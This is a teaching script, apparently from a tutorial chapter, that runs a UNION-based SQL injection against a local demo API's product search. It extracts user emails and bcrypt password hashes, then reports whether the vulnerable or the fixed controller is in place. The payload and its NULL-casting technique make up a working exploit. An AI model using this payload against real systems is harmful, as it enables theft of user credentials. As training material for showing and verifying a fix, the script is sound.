#!/usr/bin/env bash
#
# Chapter 17 — SQL injection attack against /api/products/search
#
# Runs three requests:
#   1. Benign baseline: search for "keyboard"
#   2. UNION injection: extract emails + password hashes from `users`
#   3. Result count + a sample of leaked rows
#
# Against the VULNERABLE controller you'll see user data smuggled into the
# product list. Against the FIXED controller you'll see an empty result.

set -euo pipefail

API="${API:-http://localhost:8080}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

bold "[1/3] Baseline request"
gray "  GET ${API}/api/products/search?q=keyboard"
curl -sS "${API}/api/products/search?q=keyboard" | head -c 400
echo
echo

bold "[2/3] UNION-based injection payload"
# NULL literals are type-flexible — they cast to whatever column type Postgres
# expects, so we don't have to know the exact schema of `products` to mount a
# UNION attack. Only the column we want to exfiltrate (the leaked email +
# password hash) needs a real value.
PAYLOAD="'  UNION  SELECT  NULL::uuid, email||':'||password_hash, NULL::numeric, NULL FROM users  --"
gray "  Raw payload: ${PAYLOAD}"

# URL-encode the payload using Python (avoids needing jq + curl --data-urlencode subtlety)
ENCODED=$(python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "${PAYLOAD}")
gray "  Encoded:     ${ENCODED}"
echo

URL="${API}/api/products/search?q=${ENCODED}"
gray "  GET ${URL}"
RESPONSE=$(curl -sS "${URL}")
echo "${RESPONSE}" | head -c 800
echo
echo

bold "[3/3] Leaked rows"
COUNT=$(echo "${RESPONSE}" | python3 -c "import sys, json; d=json.load(sys.stdin); print(len(d))")
echo "  Returned ${COUNT} rows."

LEAKED=$(echo "${RESPONSE}" | python3 -c "
import sys, json
rows = json.load(sys.stdin)
hits = [r for r in rows if ':' in (r.get('name') or '') and (r.get('name') or '').startswith(('admin','user','seller','alice','bob','carol','dave','eve'))]
for r in hits[:5]:
  print('  ', r['name'])
print() if hits else print('  (no leaked rows — fix is in place)')
")
echo "${LEAKED}"

if [ "${COUNT}" -gt "0" ] && echo "${RESPONSE}" | grep -q '\$2[aby]\$'; then
  bold "ATTACK SUCCEEDED — bcrypt hashes are visible above."
  echo "  Apply the fix and re-run this script."
  exit 1
else
  bold "ATTACK BLOCKED — the fix is working."
fi
